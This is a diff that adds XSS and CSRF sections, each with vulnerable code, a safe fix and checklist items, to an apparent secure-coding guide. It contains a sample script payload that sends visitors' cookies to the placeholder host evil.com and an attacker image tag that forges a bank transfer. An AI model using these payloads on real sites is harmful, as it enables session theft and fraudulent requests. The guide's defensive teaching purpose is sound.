@@ -130,6 +130,58 @@ Logging frameworks often serialize entire request objects. Confirm serializers e
 
 ---
 
+### XSS (Cross-Site Scripting)
+
+User input is rendered as HTML without escaping. Allows injecting scripts that execute in the victim's browser.
+
+```javascript
+// Vulnerable
+element.innerHTML = userInput;
+// Input: <script>document.location='https://evil.com?c='+document.cookie</script>
+// Steals session cookies from every visitor who sees this content.
+```
+
+```javascript
+// Safe: use textContent for plain text, or a sanitizer for HTML
+element.textContent = userInput;
+
+// If HTML is required (rich text editors, markdown output):
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(userInput);
+```
+
+XSS appears wherever user content is rendered: comment fields, profile names, search results, error messages. Stored XSS (content saved to DB then displayed) is more dangerous than reflected XSS (content echoed immediately). Check every place `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, or template string interpolation into HTML appears.
+
+---
+
+### CSRF (Cross-Site Request Forgery)
+
+A malicious page tricks a logged-in user's browser into making authenticated requests to your server. The browser automatically includes cookies on every request, so the attacker's request looks legitimate.
+
+```html
+<!-- Attacker's page: silently transfers money when the victim visits -->
+<img src="https://bank.example.com/transfer?to=attacker&amount=1000">
+```
+
+```python
+# Vulnerable: state-changing endpoint has no CSRF protection
+@app.route("/transfer", methods=["POST"])
+def transfer():
+    process_transfer(request.form["to"], request.form["amount"])
+```
+
+```python
+# Safe: validate CSRF token on every state-changing request
+@app.route("/transfer", methods=["POST"])
+def transfer():
+    validate_csrf_token(request.form["csrf_token"])
+    process_transfer(request.form["to"], request.form["amount"])
+```
+
+CSRF applies to all state-changing endpoints (POST, PUT, DELETE, PATCH) that rely on cookie authentication. APIs using `Authorization: Bearer` headers are not vulnerable (browsers do not auto-send custom headers cross-origin). Modern frameworks include CSRF middleware; verify it is enabled and not bypassed for any routes.
+
+---
+
 ### TOCTOU (Time-of-Check-Time-of-Use)
 
 A condition is checked, then the world changes before the action executes. The action runs on stale assumptions.
@@ -168,6 +220,8 @@ Before shipping any feature touching user input, auth, files, or databases:
 - [ ] Auth and sensitive endpoints have rate limits
 - [ ] No passwords, tokens, or PII appear in log statements
 - [ ] Shared state mutations are atomic (no check-then-act on mutable shared state)
+- [ ] User content rendered to HTML is escaped or sanitized (no raw `innerHTML`, `dangerouslySetInnerHTML`)
+- [ ] State-changing endpoints validate CSRF tokens (or use header-based auth, not cookies)
 
 ---
 
